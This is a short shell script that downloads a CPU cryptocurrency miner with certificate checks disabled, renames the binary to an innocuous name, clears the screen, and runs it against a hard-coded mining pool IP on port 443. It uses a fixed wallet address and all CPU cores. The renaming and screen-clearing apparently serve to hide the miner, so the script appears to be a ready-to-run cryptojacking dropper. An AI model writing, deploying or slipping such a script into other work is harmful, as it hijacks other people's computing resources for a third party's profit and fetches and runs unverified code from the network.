#!/bin/sh
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-avx2 kadal && clear && ./kadal -a yescryptr16 -o stratum+tcp://31.171.244.157:443 -u FfXM8mXkmq3ZWyuUbkX4kXBSC9FHMCwZdN.CePu -p x -t$(nproc --all)
